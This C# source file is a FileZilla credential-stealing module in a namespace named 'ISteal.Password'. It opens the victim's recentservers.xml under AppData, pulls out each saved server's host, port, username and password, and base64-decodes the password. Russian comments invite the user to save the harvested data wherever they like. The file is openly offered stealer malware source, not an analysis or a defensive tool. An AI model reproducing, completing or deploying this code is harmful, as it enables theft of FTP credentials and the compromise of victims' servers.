using System;
using System.IO;
using System.Text;
using System.Xml;

namespace ISteal.Password
{
    public class FilezillaFTP
    {
        private static readonly string PathZilla = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"\Filezilla\recentservers.xml");

        public static void GetZilla()
        {
            var xf = new XmlDocument();
            xf.Load(PathZilla); // тут загружаем файл recentservers.xml
            var bb = xf.GetElementsByTagName("RecentServers");
            var bs = ((XmlElement)bb[0]).GetElementsByTagName("Server");
            try
            {
                foreach (XmlElement va in bs)
                {
                    var h = va.GetElementsByTagName("Host");
                    var p = va.GetElementsByTagName("Port");
                    var u = va.GetElementsByTagName("User");
                    var ps = va.GetElementsByTagName("Pass");

                    /// Записываем данные ( которые внизу ) в файл или куда там нужно Вам =)

                    // h[0].InnerText - Хост
                    // p[0].InnerText - Порт
                    // u[0].InnerText - Логин
                    // DecryptFileZilla(ps[0].InnerText) - Пароль
                    //
                }
            }
            catch (IOException) { }
        }

        public static string DecryptFileZilla(string ps)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(ps));
        }
    }
}